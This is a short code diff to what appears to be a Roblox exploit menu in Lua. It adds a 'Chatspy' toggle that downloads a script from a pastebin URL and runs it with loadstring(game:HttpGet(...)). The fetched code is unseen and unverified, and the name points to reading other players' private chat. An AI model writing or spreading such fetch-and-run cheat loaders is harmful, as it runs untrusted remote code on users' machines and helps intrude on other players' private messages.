@@ -96,6 +96,22 @@ Section2_Tab1:AddToggle({
     end
 })
 
+-- Add a toggle for Chatspy
+Section3_Tab1:AddToggle({
+    Name = "Chatspy",
+    Default = false,
+    Callback = function(Value)
+        if Value then
+            -- Load and execute the Chatspy script
+            local scriptUrl = "https://pastebin.com/raw/nzXicwc1"
+            loadstring(game:HttpGet(scriptUrl, true))()
+            print("Chatspy script executed")
+        else
+            -- You can add code here to revert any changes made by the Chatspy script
+        end
+    end
+})
+
 -- Add sections to Tab Two
 local Section1_Tab2 = Tab2:AddSection({
     Name = "Section 1 - Tab Two"
